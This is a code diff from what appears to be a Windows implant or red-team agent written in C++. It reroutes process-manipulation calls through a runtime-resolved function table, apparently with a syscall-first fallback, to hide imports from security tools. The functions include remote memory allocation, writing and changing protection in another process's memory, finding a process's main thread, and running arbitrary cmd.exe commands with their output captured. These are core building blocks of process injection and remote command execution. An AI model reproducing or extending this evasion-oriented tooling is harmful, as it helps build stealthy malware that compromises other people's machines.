@@ -50,7 +50,7 @@ namespace System::Process
 			RtlZeroMemory(&si, sizeof(si));
 			si.cb = sizeof(si);
 
-			if (CreateProcessW(
+			if (pProcs->lpCreateProcessW(
 				lpApplicationName,
 				nullptr,
 				nullptr,
@@ -73,14 +73,16 @@ namespace System::Process
 		return hProcess;
 	}
 
-    DWORD ProcessGetIdByName(LPCWSTR lpProcessName)
-    {
+    DWORD ProcessGetIdByName(
+		Procs::PPROCS pProcs,
+		LPCWSTR lpProcessName
+	) {
         DWORD pid = 0;
-        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        HANDLE hSnapshot = pProcs->lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hSnapshot != INVALID_HANDLE_VALUE) {
             PROCESSENTRY32 pe32;
             pe32.dwSize = sizeof(PROCESSENTRY32);
-            if (Process32First(hSnapshot, &pe32))
+            if (pProcs->lpProcess32FirstW(hSnapshot, &pe32))
             {
                 do
                 {
@@ -89,26 +91,23 @@ namespace System::Process
                         pid = pe32.th32ProcessID;
                         break;
                     }
-                } while (Process32Next(hSnapshot, &pe32));
+                } while (pProcs->lpProcess32NextW(hSnapshot, &pe32));
                 
             }
-            CloseHandle(hSnapshot);
+            pProcs->lpCloseHandle(hSnapshot);
         }
 
         return pid;
     }
 
-	DWORD ProcessGetMainThreadId(DWORD dwProcessId)
-	{
-		Stdout::DisplayMessageBoxW(
-			Utils::Convert::DWORDToWstring(dwProcessId).c_str(),
-			L"ProcessGetMainThreadId dwProcessId"
-		);
-		
+	DWORD ProcessGetMainThreadId(
+		Procs::PPROCS pProcs,
+		DWORD dwProcessId
+	) {		
 		DWORD dwMainThreadId = 0;
 		THREADENTRY32 te32;
 
-		HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+		HANDLE hThreadSnap = pProcs->lpCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 		if (hThreadSnap == INVALID_HANDLE_VALUE)
 		{
 			return 0;
@@ -116,22 +115,20 @@ namespace System::Process
 
 		te32.dwSize = sizeof(THREADENTRY32);
 
-		if (!Thread32First(hThreadSnap, &te32))
+		if (!pProcs->lpThread32First(hThreadSnap, &te32))
 		{
-			CloseHandle(hThreadSnap);
+			pProcs->lpCloseHandle(hThreadSnap);
 			return 0;
 		}
-
-		Stdout::DisplayMessageBoxA("Thread32First OK", "ProcessGetMainThreadId");
 
 		do
 		{
 			if (te32.th32OwnerProcessID > 1000)
 			{
-				Stdout::DisplayMessageBoxW(
-					Utils::Convert::DWORDToWstring(te32.th32OwnerProcessID).c_str(),
-					L"ProcessGetMainThreadId te32.th32OwnerProcessID"
-				);
+				// Stdout::DisplayMessageBoxW(
+				// 	Utils::Convert::DWORDToWstring(te32.th32OwnerProcessID).c_str(),
+				// 	L"ProcessGetMainThreadId te32.th32OwnerProcessID"
+				// );
 			}
 
 			if (te32.th32OwnerProcessID == dwProcessId)
@@ -140,9 +137,9 @@ namespace System::Process
 				break;
 			}
 
-		} while (Thread32Next(hThreadSnap, &te32));
+		} while (pProcs->lpThread32Next(hThreadSnap, &te32));
 
-		CloseHandle(hThreadSnap);
+		pProcs->lpCloseHandle(hThreadSnap);
 		
 		return dwMainThreadId;
 	}
@@ -168,7 +165,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			hProcess = OpenProcess(
+			hProcess = pProcs->lpOpenProcess(
 				dwDesiredAccess,
 				FALSE,
 				dwProcessID
@@ -194,7 +191,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			if (!OpenProcessToken(
+			if (!pProcs->lpOpenProcessToken(
 				hProcess,
 				dwDesiredAccess,
 				&hToken
@@ -219,7 +216,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			return TerminateProcess(hProcess, EXIT_SUCCESS);
+			return pProcs->lpTerminateProcess(hProcess, EXIT_SUCCESS);
 		}
 		return TRUE;
 	}
@@ -244,7 +241,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			return VirtualAllocEx(
+			return pProcs->lpVirtualAllocEx(
                 hProcess,
                 pBaseAddr,
                 dwSize,
@@ -275,7 +272,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			if (!ReadProcessMemory(
+			if (!pProcs->lpReadProcessMemory(
 				hProcess,
 				(LPCVOID)pBaseAddr,
 				pBuffer,
@@ -308,7 +305,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			if (!WriteProcessMemory(
+			if (!pProcs->lpWriteProcessMemory(
 				hProcess,
 				pBaseAddr,
 				pBuffer,
@@ -341,7 +338,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			if (!VirtualProtectEx(
+			if (!pProcs->lpVirtualProtectEx(
 				hProcess,
 				pBaseAddr,
 				*pdwSize,
@@ -371,7 +368,7 @@ namespace System::Process
 		);
 		if (status != STATUS_SUCCESS)
 		{
-			return VirtualFree(
+			return pProcs->lpVirtualFree(
 				pBaseAddr,
 				*pdwSize,
 				dwFreeType
@@ -465,18 +462,18 @@ namespace System::Process
 		sa.bInheritHandle = TRUE;
 		sa.lpSecurityDescriptor = NULL;
 
-		if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
+		if (!pProcs->lpCreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
 		{
 			return L"";
 		}
 
-		if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
+		if (!pProcs->lpSetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
 		{
 			return L"";
 		}
 
-		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-		ZeroMemory(&si, sizeof(STARTUPINFOW));
+		RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+		RtlZeroMemory(&si, sizeof(STARTUPINFOW));
 
 		si.cb = sizeof(STARTUPINFOW);
 		si.hStdError = hWritePipe;
@@ -486,7 +483,7 @@ namespace System::Process
 
 		// Set application name (full path)
 		WCHAR system32Path[MAX_PATH];
-		GetSystemDirectoryW(system32Path, MAX_PATH);
+		pProcs->lpGetSystemDirectoryW(system32Path, MAX_PATH);
 		std::wstring wSystem32Path = std::wstring(system32Path);
 		const std::wstring applicationName = wSystem32Path + L"\\cmd.exe";
 		// const std::wstring applicationName = wSystem32Path + L"\\WindowsPowerShell\\v1.0\powershell.exe";
@@ -495,7 +492,7 @@ namespace System::Process
 		std::wstring commandLine = L"/C " + wCmd;
 		// std::wstring commandLine = L"-c " + cmd;
 
-		bResults = CreateProcessW(
+		bResults = pProcs->lpCreateProcessW(
 			applicationName.c_str(),
 			&commandLine[0],
 			NULL,
@@ -516,17 +513,17 @@ namespace System::Process
 		DWORD dwRead;
 		CHAR chBuf[4096];
 		
-		CloseHandle(hWritePipe);
+		pProcs->lpCloseHandle(hWritePipe);
 
-		while (ReadFile(hReadPipe, chBuf, 4095, &dwRead, NULL) && dwRead > 0)
+		while (pProcs->lpReadFile(hReadPipe, chBuf, 4095, &dwRead, NULL) && dwRead > 0)
 		{
 			chBuf[dwRead] = '\0';
 			result += std::wstring(chBuf, chBuf + dwRead);
 		}
 
-		CloseHandle(pi.hProcess);
-		CloseHandle(pi.hThread);
-		CloseHandle(hReadPipe);
+		pProcs->lpCloseHandle(pi.hProcess);
+		pProcs->lpCloseHandle(pi.hThread);
+		pProcs->lpCloseHandle(hReadPipe);
 
 		return result;
 	}
